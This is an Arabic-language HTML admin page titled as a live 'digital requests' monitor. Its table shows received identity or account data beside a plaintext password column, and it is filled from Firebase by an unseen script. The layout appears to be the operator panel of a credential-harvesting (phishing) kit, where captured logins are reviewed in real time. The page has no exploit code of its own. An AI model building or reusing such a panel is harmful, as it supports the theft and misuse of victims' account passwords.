<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - استعراض البيانات الشاملة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h2 { color: #14805e; border-bottom: 2px solid #14805e; padding-bottom: 10px; }
        .table-container { background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.05); overflow-x: auto; margin-top: 20px; }
        table { width: 100%; border-collapse: collapse; text-align: right; }
        th, td { padding: 15px; border-bottom: 1px solid #eee; }
        th { background-color: #14805e; color: white; font-weight: 600; }
        tr:hover { background-color: #f9f9f9; }
        .status-badge { padding: 5px 10px; border-radius: 20px; font-size: 13px; font-weight: 600; text-align: center; display: inline-block; }
        .waiting { background-color: #fef3c7; color: #d97706; }
        .approved { background-color: #d1fae5; color: #065f46; }
        .type-badge { padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
        .type-app { background-color: #e0f2fe; color: #0369a1; }
        .type-pass { background-color: #f3e8ff; color: #6b21a8; }
    </style>
</head>
<body>

    <div class="container">
        <h2><i class="fa-solid fa-users-gear"></i> مراقبة الطلبات الرقمية (لحظياً)</h2>
        
        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>نوع الطلب</th>
                        <th>البيانات المستلمة (الهوية / الحساب)</th>
                        <th>كلمة المرور</th>
                        <th>التاريخ والوقت</th>
                        <th>الحالة المعالجة</th>
                    </tr>
                </thead>
                <tbody id="logsTableBody">
                    </tbody>
            </table>
        </div>
    </div>

    <script type="importmap">
      {
        "imports": {
          "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
          "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
        }
      }
    </script>
    <script type="module" src="admin.js"></script>
</body>
</html>
